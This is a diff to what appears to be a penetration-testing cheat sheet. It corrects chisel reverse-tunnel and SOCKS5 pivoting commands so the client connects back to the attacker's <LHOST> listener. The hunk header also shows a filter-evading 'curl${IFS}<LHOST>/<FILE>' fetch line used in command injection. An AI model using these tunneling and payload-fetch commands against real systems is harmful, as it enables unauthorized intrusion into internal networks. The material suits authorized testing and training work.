@@ -527,14 +527,14 @@ curl${IFS}<LHOST>/<FILE>                                                       /
 
 ```c
 ./chisel server -p 9002 -reverse -v
-./chisel client <RHOST>:9002 R:9003:127.0.0.1:8888
+./chisel client <LHOST>:9002 R:9003:127.0.0.1:8888
 ```
 
 ##### SOCKS5 / Proxychains Configuration
 
 ```c
 ./chisel server -p 9002 -reverse -v
-./chisel client <RHOST>:9002 R:socks
+./chisel client <LHOST>:9002 R:socks
 ```
 
 #### File Transfer
